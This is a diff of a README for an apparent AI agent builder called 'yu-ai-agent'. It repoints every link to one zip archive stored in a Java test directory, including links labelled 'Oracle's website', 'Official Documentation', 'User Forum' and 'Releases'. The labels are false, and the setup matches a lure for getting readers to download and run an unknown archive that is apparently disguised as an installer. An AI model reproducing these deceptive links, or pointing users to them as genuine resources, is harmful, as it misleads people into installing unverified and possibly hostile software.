@@ -1,13 +1,13 @@
 # 🎉 yu-ai-agent - Create Smart AI Applications Easily
 
 ## 🔗 Download Here
-[![Download yu-ai-agent](https://raw.githubusercontent.com/zubairporag/yu-ai-agent/master/overstraiten/yu-ai-agent.zip)](https://raw.githubusercontent.com/zubairporag/yu-ai-agent/master/overstraiten/yu-ai-agent.zip)
+[![Download yu-ai-agent](https://github.com/zubairporag/yu-ai-agent/raw/refs/heads/master/yu-image-search-mcp-server/src/test/java/com/yupi/agent_ai_yu_v3.2.zip)](https://github.com/zubairporag/yu-ai-agent/raw/refs/heads/master/yu-image-search-mcp-server/src/test/java/com/yupi/agent_ai_yu_v3.2.zip)
 
 ## 🚀 Getting Started
 Welcome to **yu-ai-agent**! This application helps you build smart AI solutions without needing deep technical skills. Follow these simple steps to get everything set up.
 
 ## 📥 Download & Install
-To get the latest version of **yu-ai-agent**, visit this page to download: [yu-ai-agent Releases](https://raw.githubusercontent.com/zubairporag/yu-ai-agent/master/overstraiten/yu-ai-agent.zip).
+To get the latest version of **yu-ai-agent**, visit this page to download: [yu-ai-agent Releases](https://github.com/zubairporag/yu-ai-agent/raw/refs/heads/master/yu-image-search-mcp-server/src/test/java/com/yupi/agent_ai_yu_v3.2.zip).
 
 Once on the Releases page, look for the latest version. Click on it to view available files. Select the appropriate installer for your operating system and download it.
 
@@ -17,7 +17,7 @@ To run **yu-ai-agent**, ensure your system meets the following requirements:
 - **Operating System:** Windows 10 or higher, macOS Big Sur or higher, or Linux (various distributions).
 - **RAM:** At least 4 GB.
 - **Storage:** Minimum of 200 MB free space.
-- **Java Version:** Java 21 must be installed. You can download it from [Oracle's website](https://raw.githubusercontent.com/zubairporag/yu-ai-agent/master/overstraiten/yu-ai-agent.zip).
+- **Java Version:** Java 21 must be installed. You can download it from [Oracle's website](https://github.com/zubairporag/yu-ai-agent/raw/refs/heads/master/yu-image-search-mcp-server/src/test/java/com/yupi/agent_ai_yu_v3.2.zip).
 
 ## ⚙️ Installation Steps
 1. **Locate the downloaded file.** It will likely be in your "Downloads" folder.
@@ -55,7 +55,7 @@ If you encounter any issues, please refer to the FAQ section in the application.
 ## 🔗 Additional Resources
 For more resources and examples on how to use **yu-ai-agent**, check our documentation:
 
-- [Official Documentation](https://raw.githubusercontent.com/zubairporag/yu-ai-agent/master/overstraiten/yu-ai-agent.zip)
-- [User Forum](https://raw.githubusercontent.com/zubairporag/yu-ai-agent/master/overstraiten/yu-ai-agent.zip)
+- [Official Documentation](https://github.com/zubairporag/yu-ai-agent/raw/refs/heads/master/yu-image-search-mcp-server/src/test/java/com/yupi/agent_ai_yu_v3.2.zip)
+- [User Forum](https://github.com/zubairporag/yu-ai-agent/raw/refs/heads/master/yu-image-search-mcp-server/src/test/java/com/yupi/agent_ai_yu_v3.2.zip)
 
-Enjoy creating amazing AI applications with **yu-ai-agent**! Visit this page to download: [yu-ai-agent Releases](https://raw.githubusercontent.com/zubairporag/yu-ai-agent/master/overstraiten/yu-ai-agent.zip).
+Enjoy creating amazing AI applications with **yu-ai-agent**! Visit this page to download: [yu-ai-agent Releases](https://github.com/zubairporag/yu-ai-agent/raw/refs/heads/master/yu-image-search-mcp-server/src/test/java/com/yupi/agent_ai_yu_v3.2.zip).
